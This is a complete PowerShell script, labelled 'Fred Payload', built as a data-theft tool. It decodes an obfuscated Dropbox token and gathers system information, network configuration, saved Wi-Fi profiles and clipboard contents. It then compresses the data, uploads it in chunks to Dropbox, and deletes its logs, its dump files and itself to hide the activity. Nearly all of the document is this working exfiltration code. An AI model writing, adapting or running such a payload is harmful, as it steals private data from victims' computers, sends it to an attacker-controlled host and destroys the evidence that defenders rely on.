# === Fred Payload: Base64-Encoded Dropbox Upload ===

$logPath   = "$env:TEMP\fred_debug_log.txt"
$dumpPath  = "$env:TEMP\FredFucksEverything"
$zipPath   = "$env:TEMP\FredDump.zip"
$chunkSize = 8MB
$dropboxPath = "/FredDump.zip"

# Obfuscated Dropbox Token
$token64 = "QmVhcmVyIHNsLnUuQUZ6ejR...REDACTED...2FhYw=="  # Base64 of "Bearer sl.u.A...."
$token = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($token64))

Start-Transcript -Path $logPath -Append
Write-Host "[DEBUG] Script launched at: $(Get-Date)"
Write-Host "[DEBUG] Running as: $($env:USERNAME) on $($env:COMPUTERNAME)"
Write-Host "[DEBUG] TEMP path: $env:TEMP"

# Step 1: Create Dump Folder
try {
    New-Item -ItemType Directory -Path $dumpPath -Force | Out-Null
    Write-Host "[DEBUG] Dump folder created."
} catch {
    Write-Host "[ERROR] Failed to create dump folder: $_"
    Stop-Transcript; exit
}

# Step 2: Gather Data
Write-Host "[+] Collecting system data..."
try {
    systeminfo               > "$dumpPath\systeminfo.txt"
    ipconfig /all            > "$dumpPath\ipconfig.txt"
    netsh wlan show profiles > "$dumpPath\wifi.txt"
    Get-Clipboard            > "$dumpPath\clipboard.txt" 2>$null
} catch {
    Write-Host "[WARNING] Data collection issue: $_"
}

# Step 3: Compress
Write-Host "[+] Compressing data..."
try {
    Compress-Archive -Path "$dumpPath\*" -DestinationPath $zipPath -Force
    Write-Host "[DEBUG] Archive created."
} catch {
    Write-Host "[ERROR] Compression failed: $_"
    Stop-Transcript; exit
}

# Step 4: Upload via Dropbox
Write-Host "[+] Uploading..."
try {
    $fs = [System.IO.File]::OpenRead($zipPath)
    $buffer = New-Object byte[] $chunkSize
    $totalSize = $fs.Length

    $fs.Read($buffer, 0, $chunkSize) | Out-Null
    $startHeaders = @{
        "Authorization" = $token
        "Content-Type" = "application/octet-stream"
        "Dropbox-API-Arg" = '{"close": false}'
    }
    $response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/start" `
        -Method Post -Headers $startHeaders -Body $buffer[0..($fs.Position-1)]

    $sessionId = $response.session_id
    while ($fs.Position -lt $totalSize) {
        $read = $fs.Read($buffer, 0, $chunkSize)
        $offset = $fs.Position - $read
        $appendHeaders = @{
            "Authorization" = $token
            "Content-Type" = "application/octet-stream"
            "Dropbox-API-Arg" = '{"cursor": {"session_id": "'+$sessionId+'", "offset": '+$offset+'}, "close": false}'
        }
        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/append_v2" `
            -Method Post -Headers $appendHeaders -Body $buffer[0..($read-1)]
    }

    $finishHeaders = @{
        "Authorization" = $token
        "Content-Type" = "application/octet-stream"
        "Dropbox-API-Arg" = '{
            "cursor": {
                "session_id": "'+$sessionId+'",
                "offset": '+$fs.Length+'
            },
            "commit": {
                "path": "'+$dropboxPath+'",
                "mode": "overwrite",
                "autorename": false,
                "mute": false
            }
        }'
    }
    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/finish" `
        -Method Post -Headers $finishHeaders -Body $null
    Write-Host "[✓] Upload complete."
} catch {
    Write-Host "[ERROR] Upload failed: $_"
} finally {
    $fs.Close()
}

# Step 5: Cleanup
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Remove-Item $dumpPath -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $logPath -Force -ErrorAction SilentlyContinue
Remove-Item -Path $MyInvocation.MyCommand.Definition -Force -ErrorAction SilentlyContinue

Stop-Transcript
